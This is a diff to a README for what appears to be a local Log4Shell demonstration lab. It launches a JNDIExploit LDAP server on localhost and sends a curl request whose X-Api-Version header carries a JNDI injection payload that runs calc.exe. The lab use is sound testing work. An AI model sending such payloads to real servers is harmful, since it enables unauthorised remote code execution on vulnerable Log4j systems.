@@ -107,7 +107,9 @@ https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/
     # mvn clean package # disabled due to issues with dependencies.
     java -jar .\etc\JNDIExploit-1.2-SNAPSHOT-from-black9-Log4shell_JNDIExploit.jar -i localhost -p 8081
 
-### Send payload to vulnerable target (need GNU curl.exe...)
+### Send payload to vulnerable target (need GNU curl...)
 
-    choco install -y curl
-    curl.exe 127.0.0.1:8080 -H "X-Api-Version: ${jndi:ldap://localhost:1389/Basic/Command/Base64/Y2FsYy5leGU=}"
+```bash
+choco install -y curl
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://localhost:1389/Basic/Command/Base64/Y2FsYy5leGU=}'
+```
